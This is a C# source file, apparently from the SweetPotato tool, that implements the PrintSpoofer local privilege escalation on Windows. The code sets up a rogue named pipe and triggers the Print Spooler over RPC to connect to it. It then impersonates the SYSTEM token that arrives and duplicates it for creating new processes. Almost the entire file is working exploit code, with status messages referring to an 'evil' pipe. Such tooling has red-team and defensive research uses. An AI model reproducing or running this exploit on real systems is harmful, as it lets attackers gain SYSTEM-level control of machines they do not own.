b'\xef\xbb\xbfusing NtApiDotNet.Ndr.Marshal;\nusing NtApiDotNet.Win32;\nusing rpc_12345678_1234_abcd_ef00_0123456789ab_1_0;\nusing System;\nusing System.Collections.Generic;\nusing System.IO.Pipes;\nusing System.Linq;\nusing System.Text;\nusing System.Threading;\nusing System.Threading.Tasks;\n\nnamespace SweetPotato {\n    internal class PrintSpoofer {\n\n        static int PRINTER_CHANGE_ADD_JOB = 0x00000100;\n\n        string pipeName = Guid.NewGuid().ToString();\n        string hostName = System.Net.Dns.GetHostName();\n\n        NamedPipeServerStream spoolPipe;\n        Thread spoolPipeThread;\n        IntPtr systemImpersonationToken = IntPtr.Zero;\n\n        public IntPtr Token { get {return systemImpersonationToken; } }\n\n        void SpoolPipeThread() {\n\n            byte[] data = new byte[4];\n\n            spoolPipe = new NamedPipeServerStream($"{pipeName}\\\\pipe\\\\spoolss", PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.None, 2048, 2048);\n            spoolPipe.WaitForConnection();\n\n            Console.WriteLine("[+] Server connected to our evil RPC pipe");\n\n            spoolPipe.Read(data, 0, 4);\n\n            spoolPipe.RunAsClient(() => {\n                if (!ImpersonationToken.OpenThreadToken(ImpersonationToken.GetCurrentThread(),\n                    ImpersonationToken.TOKEN_ALL_ACCESS, false, out var tokenHandle)) {\n                    Console.WriteLine("[-] Failed to open thread token");\n                    return;\n                }\n\n                if (!ImpersonationToken.DuplicateTokenEx(tokenHandle, ImpersonationToken.TOKEN_ALL_ACCESS, IntPtr.Zero,\n                    ImpersonationToken.SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,\n                    ImpersonationToken.TOKEN_TYPE.TokenPrimary, out systemImpersonationToken)) {\n                    Console.WriteLine("[-] Failed to duplicate impersonation token");\n                    return;\n                }\n                \n                Console.WriteLine("[+] Duplicated impersonation token ready for process creation");\n            });\n\n            spoolPipe.Close();\n        }\n\n        public PrintSpoofer() {\n            spoolPipeThread = new Thread(SpoolPipeThread);\n            spoolPipeThread.Start();\n        }\n\n        public void TriggerPrintSpoofer() {\n\n            string captureServer = string.Format($"\\\\\\\\{hostName}/pipe/{pipeName}");\n            string printerHost = string.Format($"\\\\\\\\{hostName}");\n\n            Client c = new Client();\n            c.Connect();\n\n            Struct_0 devModeContainer = new Struct_0();\n\n            if (c.RpcOpenPrinter(printerHost, out var handle, null, devModeContainer, 0) != 0) {\n                Console.WriteLine("[-] Failed to open printer over RPC");\n                return;\n            }\n\n            Console.WriteLine($"[+] Triggering notification on evil PIPE {captureServer}");\n            c.RpcRemoteFindFirstPrinterChangeNotificationEx(handle, PRINTER_CHANGE_ADD_JOB, 0, captureServer, 0, null);\n            c.RpcClosePrinter(ref handle);\n        }\n    }\n}\n'